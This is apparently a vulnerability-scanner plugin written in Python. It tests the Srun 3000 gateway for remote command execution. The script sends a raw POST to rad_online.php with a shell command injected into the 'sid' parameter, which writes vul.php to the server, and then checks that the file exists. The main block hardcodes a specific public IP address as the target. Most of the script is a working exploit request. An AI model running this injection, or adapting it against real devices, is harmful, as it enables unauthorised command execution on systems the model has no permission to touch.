#!/usr/bin/env python
#-*- coding:utf-8 -*-

import urlparse
def assign(service, arg):
    if service == 'srun_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc = arg + 'rad_online.php'
    raw = '''POST /rad_online.php HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Accept-Encoding: gzip, deflate, sdch
Cookie: PHPSESSID=r16jb4krcq7ab84tduho3b9mj4
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

action=dm&sid=;echo+'vulnerable' > vul.php;
'''
    code, head, res, errcode, _ = curl.curl2(poc,raw=raw)
    verify = arg+'vul.php'
    code, head, res, errcode, _ = curl.curl2(verify)
    if 'vulnerable' in res:
        security_hole("Srun_3000 Gate RCE vulnerable!:"+verify)

if __name__ == '__main__':
    from dummy import *
    audit(assign('srun_gateway', 'http://223.72.180.45/')[1])